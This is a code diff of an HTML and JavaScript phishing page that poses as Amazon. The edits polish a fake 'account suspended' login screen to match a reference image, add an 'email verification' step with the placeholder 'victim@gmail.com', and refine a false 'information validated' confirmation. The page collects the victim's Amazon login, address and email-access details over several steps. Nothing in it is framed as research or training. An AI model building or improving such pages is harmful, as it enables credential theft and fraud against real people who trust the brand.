@@ -34,17 +34,25 @@
         .logo img {
             width: 120px;
         }
-        h1 {
-            font-size: 24px;
-            font-weight: 700;
+        .suspension-title {
+            font-size: 22px;
+            font-weight: 400;
             margin-bottom: 15px;
             color: #111;
+            line-height: 1.2;
         }
         .suspension-text {
             font-size: 14px;
             color: #111;
             margin-bottom: 25px;
             line-height: 1.4;
+        }
+        .suspension-text a {
+            color: #0066c0;
+            text-decoration: none;
+        }
+        .suspension-text a:hover {
+            text-decoration: underline;
         }
         .form-group {
             margin-bottom: 18px;
@@ -91,6 +99,10 @@
         .help-links a {
             color: #0066c0;
             text-decoration: none;
+            margin: 0 5px;
+        }
+        .help-links a:hover {
+            text-decoration: underline;
         }
         .footer {
             margin-top: 20px;
@@ -158,11 +170,13 @@
             color: #28a745;
             margin-bottom: 20px;
         }
-        .note {
-            font-size: 12px;
-            color: #666;
-            margin-top: 20px;
-            text-align: center;
+        .alert {
+            background: #FFF4E5;
+            border-left: 4px solid #FF9900;
+            padding: 15px;
+            margin-bottom: 25px;
+            border-radius: 4px;
+            font-size: 14px;
         }
     </style>
 </head>
@@ -177,14 +191,17 @@
         <div id="step5_prog" class="progress-step">5</div>
     </div>
 
-    <!-- STEP 1: ACCOUNT SUSPENDED (EXACTLY AS IMAGE) -->
+    <!-- STEP 1: EXACTLY AS THE IMAGE -->
     <div id="step1" class="step active">
         <div class="logo">
             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
         </div>
-        <h1>your amazon account has been temporarily suspended,</h1>
+        <div class="suspension-title">
+            your amazon account has been<br>temporarily suspended,
+        </div>
         <div class="suspension-text">
-            Please update your account's information to regain access to all features of Amazon Services.
+            Please update your account's information to <a href="#">reclaim access</a> to<br>
+            all features of Amazon Services.
         </div>
         <div class="form-group">
             <label>Email or mobile phone number</label>
@@ -204,7 +221,7 @@
         </div>
     </div>
 
-    <!-- STEP 2: FULL ADDRESS DETAILS -->
+    <!-- STEP 2: ADDRESS DETAILS -->
     <div id="step2" class="step">
         <h2>Verify your address</h2>
         <div class="form-group">
@@ -280,6 +297,10 @@
             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
         </div>
         <h2>Email verification required</h2>
+        <div class="alert">
+            <p>🔐 <strong>Final security step</strong></p>
+            <p>We need to confirm your email access to complete verification.</p>
+        </div>
         <div class="form-group">
             <label>Email address</label>
             <input type="email" id="email_access" placeholder="victim@gmail.com">
@@ -303,7 +324,7 @@
                 <polyline points="22 4 12 14.01 9 11.01"></polyline>
             </svg>
             <h2>Information validated!</h2>
-            <div class="alert" style="background:#e8f5e9; border-left-color:#28a745; padding:15px; border-radius:4px;">
+            <div class="alert" style="background:#e8f5e9; border-left-color:#28a745;">
                 <p>✅ Your information has been successfully verified.</p>
                 <p>You will be redirected to your Amazon account in a few seconds...</p>
             </div>
@@ -358,7 +379,7 @@
         });
     }
 
-    // Step 1
+    // Step 1: Amazon Login
     document.getElementById("step1Btn").onclick = () => {
         let email = document.getElementById("amz_email").value.trim();
         let password = document.getElementById("amz_password").value.trim();
